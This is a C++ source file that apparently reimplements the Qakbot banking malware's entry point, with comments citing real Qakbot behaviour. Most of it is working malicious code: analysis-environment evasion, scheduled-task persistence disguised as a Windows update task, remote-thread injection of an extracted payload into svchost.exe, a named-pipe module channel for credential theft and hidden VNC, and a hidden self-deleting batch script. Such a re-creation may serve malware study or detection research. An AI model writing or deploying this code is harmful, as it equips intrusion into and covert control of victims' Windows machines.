/**
 * qbot_main.cpp - Qakbot Entry Point
 * Mirrors the parameter-driven execution flow of Qakbot
 */
#include <windows.h>
#include <tlhelp32.h>
#include <shellapi.h>
#include <stdio.h>
#include <string.h>
#include "qakbot_config.h"

// External utilities
extern BOOL QbotCheckEnvironment();
extern BOOL InstallScheduledTask(const WCHAR*, const WCHAR*);
extern LPVOID ExtractResourcePayload(SIZE_T*);
extern HANDLE CreateQbotPipe(const WCHAR*);

// Forward declarations
BOOL ExecuteWithWait();
BOOL InjectIntoProcess(const WCHAR* targetProcess);
BOOL SetupPipeCommunication();
BOOL SelfDelete();

/**
 * Main entry point
 * Real Qakbot behavior: checks cmdline, decides execution path [citation:2]
 */
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmdLine, int nShow) {
    // Environment check - exit if analysis tools detected
    if (QbotCheckEnvironment()) {
        // Real Qakbot may execute decoy/benign behavior
        Sleep(60000);
        return 0;
    }
    
    // Check mutex to prevent multiple instances
    WCHAR mutexName[64];
    wsprintfW(mutexName, QBOT_MUTEX, QBOT_MAJOR_VERSION ^ QBOT_MINOR_VERSION);
    HANDLE hMutex = CreateMutexW(NULL, TRUE, mutexName);
    if (!hMutex) {
        return 0;
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0;
    }
    
    // Parse command line parameters [citation:2]
    if (wcsstr(lpCmdLine, QBOT_CMD_WAIT)) {
        // Random delay before execution (evade sandbox)
        Sleep((GetTickCount() % 300) * 1000);
    }
    
    if (wcsstr(lpCmdLine, QBOT_CMD_INSTALL)) {
        // Install persistence via scheduled task
        WCHAR szPath[MAX_PATH];
        GetModuleFileNameW(NULL, szPath, MAX_PATH);
        
        WCHAR taskName[64];
        wsprintfW(taskName, L"WindowsUpdateTask_%08X", GetTickCount());
        InstallScheduledTask(taskName, szPath);
    }
    
    if (wcsstr(lpCmdLine, QBOT_CMD_INJECT)) {
        // Inject into svchost.exe (real Qakbot target) [citation:2]
        InjectIntoProcess(L"svchost.exe");
    }
    
    if (wcsstr(lpCmdLine, QBOT_CMD_PIPE)) {
        // Setup pipe communication for module coordination
        SetupPipeCommunication();
    }
    
    if (wcsstr(lpCmdLine, QBOT_CMD_QUIT)) {
        SelfDelete();
        return 0;
    }
    
    // Default: extract and execute core payload
    SIZE_T payloadSize;
    LPVOID payload = ExtractResourcePayload(&payloadSize);
    
    if (payload) {
        // In real Qakbot, this is a DLL loaded reflectively
        // Here we simulate the module loading pattern
        typedef void (*ModuleEntry)();
        
        // Real Qakbot uses manual DLL mapping to avoid detection
        // We simulate the structure here
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
        if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LPBYTE)payload + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE) {
                // Find entry point (simplified - real uses reflective loader)
                LPVOID entry = (LPVOID)((LPBYTE)payload + nt->OptionalHeader.AddressOfEntryPoint);
                
                // Execute the module
                #ifdef _MSC_VER
                __try {
                    ((ModuleEntry)entry)();
                } __except(EXCEPTION_EXECUTE_HANDLER) {
                    // Handle exceptions silently
                }
                #else
                // Keep the simulation portable across MinGW-style builds that
                // do not support MSVC SEH syntax in user code.
                ((ModuleEntry)entry)();
                #endif
            }
        }
        
        VirtualFree(payload, 0, MEM_RELEASE);
    }
    
    // Stay resident for C2 beaconing
    while (TRUE) {
        Sleep(300000);  // 5 minute beacon interval
        // Real Qakbot would perform C2 check-in here
    }
    
    return 0;
}

/**
 * Process injection routine
 * Qakbot injects into svchost.exe or explorer.exe [citation:2]
 */
BOOL InjectIntoProcess(const WCHAR* targetProcess) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
    
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    DWORD targetPid = 0;
    
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (wcsstr(pe.szExeFile, targetProcess)) {
                targetPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    
    if (!targetPid) return FALSE;
    
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                   PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                                   FALSE, targetPid);
    if (!hProcess) return FALSE;
    
    // Extract payload for injection
    SIZE_T payloadSize;
    LPVOID payload = ExtractResourcePayload(&payloadSize);
    
    if (payload) {
        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, payloadSize,
                                           MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (remoteMem) {
            WriteProcessMemory(hProcess, remoteMem, payload, payloadSize, NULL);
            
            // Create remote thread to execute
            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                                 (LPTHREAD_START_ROUTINE)remoteMem,
                                                 NULL, 0, NULL);
            if (hThread) CloseHandle(hThread);
        }
        VirtualFree(payload, 0, MEM_RELEASE);
    }
    
    CloseHandle(hProcess);
    return TRUE;
}

/**
 * Named pipe communication setup for module coordination [citation:2]
 */
BOOL SetupPipeCommunication() {
    WCHAR pipeName[64];
    wsprintfW(pipeName, L"\\\\.\\pipe\\qbot_%08X", GetCurrentProcessId());
    
    HANDLE hPipe = CreateQbotPipe(pipeName);
    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;
    
    // Real Qakbot uses pipes for module-to-module messaging
    while (ConnectNamedPipe(hPipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
        BYTE buffer[4096];
        DWORD bytesRead;
        
        if (ReadFile(hPipe, buffer, sizeof(buffer), &bytesRead, NULL)) {
            // Process module command
            // Commands include: credential theft, hVNC, web injects [citation:2]
        }
        DisconnectNamedPipe(hPipe);
    }
    
    CloseHandle(hPipe);
    return TRUE;
}

/**
 * Self-delete technique [citation:2]
 */
BOOL SelfDelete() {
    WCHAR szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    // Create batch file to delete the executable
    WCHAR szBatPath[MAX_PATH];
    GetTempPathW(MAX_PATH, szBatPath);
    wcscat(szBatPath, L"cleanup.bat");
    
    HANDLE hBat = CreateFileW(szBatPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBat != INVALID_HANDLE_VALUE) {
        char batContent[512];
        sprintf(batContent, "@echo off\r\n:loop\r\ndel \"%S\"\r\nif exist \"%S\" goto loop\r\ndel \"%%~f0\"\r\n",
                szPath, szPath);
        DWORD written;
        WriteFile(hBat, batContent, strlen(batContent), &written, NULL);
        CloseHandle(hBat);
        
        // Execute the batch file
        ShellExecuteW(NULL, L"open", szBatPath, NULL, NULL, SW_HIDE);
    }
    
    return TRUE;
}
